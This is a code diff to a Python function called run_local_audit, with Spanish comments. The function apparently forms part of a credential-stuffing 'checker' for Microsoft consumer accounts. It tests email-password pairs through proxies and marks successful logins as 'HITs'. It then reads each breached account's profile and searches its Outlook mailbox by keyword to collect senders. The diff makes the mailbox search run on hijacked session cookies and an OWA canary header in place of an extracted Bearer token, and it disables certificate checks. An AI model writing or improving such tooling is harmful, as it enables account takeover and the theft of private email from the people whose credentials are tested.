@@ -195,6 +195,14 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword=""):
     """
     session = requests.Session()
     
+    # Definición temprana para que siempre esté disponible aunque la cuenta no sea HIT
+    api_headers = {
+        "User-Agent": "Mozilla/5.0",
+        "Accept": "application/json",
+        "X-OWA-CANARY": "",
+        "X-Requested-With": "XMLHttpRequest"
+    }
+    
     from requests.adapters import HTTPAdapter
     from urllib3.util.retry import Retry
     
@@ -273,23 +281,10 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword=""):
         if "kmsi" in res2.url.lower() or "kmsi" in res2.text.lower() or "oauth2" in res2.url.lower():
             # ¡HITS POSITIVO!
             
-            # --- EXTRACT ACCESS TOKEN FOR GRAPH API ---
-            access_token = None
-            if "access_token=" in res2.url:
-                m = re.search(r'access_token=([^&]+)', res2.url)
-                if m: access_token = m.group(1)
-            elif "access_token" in res2.text:
-                m = re.search(r'"access_token"\s*:\s*"([^"]+)"', res2.text)
-                if m: access_token = m.group(1)
-                
-            print(f"\n[DEBUG {email}] 🔐 Token extraído: {'SI' if access_token else 'NO'}")
-            
-            api_headers = {
-                "User-Agent": "Mozilla/5.0",
-                "Accept": "application/json"
-            }
-            if access_token:
-                api_headers["Authorization"] = f"Bearer {access_token}"
+            # --- USAR COOKIES DE SESIÓN PARA GRAPH API (sin Bearer Token) ---
+            # Actualizamos canary header si está disponible en cookies
+            owa_canary = session.cookies.get("X-OWA-CANARY") or ""
+            api_headers["X-OWA-CANARY"] = owa_canary
 
             profile_res = session.get("https://login.microsoftonline.com/consumers/profile/v1.0/me", verify=False, timeout=15)
             country = "XZ"
@@ -435,15 +430,16 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword=""):
             else:
                 query = keyword # Search generally by default
                 
-            search_url = f"https://outlook.office.com/api/v2.0/me/messages?$search=%22{query}%22&$top=15&$select=Id,From"
+            # Usamos outlook.live.com que autentica via cookies de sesión (no Bearer Token)
+            search_url = f"https://outlook.live.com/mail/0/api/v2.0/me/messages?$search=%22{query}%22&$top=15&$select=Id,From"
             try:
-                print(f"[DEBUG {email}] 🔎 Buscando mensajes en Graph API ({query})...")
+                print(f"[DEBUG {email}] 🔎 Buscando en Outlook Live API ({query})...")
                 sr = session.get(search_url, headers=api_headers, verify=False, timeout=15)
-                print(f"[DEBUG {email}] 📥 Graph API Status: {sr.status_code}")
+                print(f"[DEBUG {email}] 📥 Outlook Live Status: {sr.status_code}")
                 
                 if sr.status_code == 200:
                     data = sr.json()
-                    print(f"[DEBUG {email}] 📦 Graph API JSON: {str(data)[:200]}...")
+                    print(f"[DEBUG {email}] 📦 Outlook Live JSON: {str(data)[:200]}...")
                     
                     for msg in data.get("value", []):
                         sender_addr = msg.get("From", {}).get("EmailAddress", {}).get("Address")
@@ -454,9 +450,9 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword=""):
                     if "@odata.count" in data:
                         subject_count = data["@odata.count"]
                 else:
-                    print(f"[DEBUG {email}] ❌ Error Graph API Res: {sr.text[:200]}")
+                    print(f"[DEBUG {email}] ❌ Error Outlook Live Res: {sr.text[:200]}")
             except Exception as e:
-                print(f"[DEBUG {email}] ❌ Excepción Graph API: {e}")
+                print(f"[DEBUG {email}] ❌ Excepción Outlook Live: {e}")
 
         if getattr(hits_buffer, 'append', None) is not None:
             formatted_senders = ", ".join([f"{addr} ({count})" for addr, count in senders_found.items()])
